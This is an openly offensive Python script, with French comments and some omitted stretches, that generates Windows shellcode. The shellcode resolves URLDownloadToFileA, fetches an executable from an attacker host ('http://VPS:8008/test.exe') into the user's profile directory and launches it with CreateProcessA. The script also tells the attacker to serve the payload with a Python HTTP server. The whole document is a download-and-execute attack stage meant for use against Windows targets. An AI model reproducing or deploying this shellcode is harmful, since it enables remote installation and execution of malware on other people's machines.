# =============================================================================
#  SHELLCODE - Telechargement HTTP + Execution
# =============================================================================
#
...
#
#  Sequence :
#    OpenProcessToken -> GetUserProfileDirectoryA -> lstrcatA
#    -> URLDownloadToFileA -> CreateProcessA -> TerminateProcess
#
#  Variante "Download" du template MoveFileA : meme squelette, on remplace la
#  copie SMB par un GET HTTP. URLDownloadToFileA depose le fichier dans le
#  profil utilisateur, puis CreateProcessA l'execute.
#
...
#  offset en dur.
#
#  Cote attaquant, servir le fichier avant : python -m http.server 80
# =============================================================================
...
URL         = "http://VPS:8008/test.exe"   # Source HTTP a telecharger
...
DLL_URLMON  = "urlmon.dll"            # Exporte URLDownloadToFileA
...
RESOLUTION = (
    ...
    + charger_dll_asm(DLL_URLMON)
    + resoudre_asm("URLDownloadToFileA")
)
...
ACTIONS = (
    ...
    # --- URLDownloadToFileA(0, URL, pathVar, 0, 0) ---
    + push_string_asm(URL)
    + "mov esi, esp\n"                       # ESI -> URL
    + "xor eax, eax\n"
    + "push eax\n"                           # lpfnCB = NULL
...
print("[*] Cote attaquant : python -m http.server 80  (servir le fichier AVANT)")
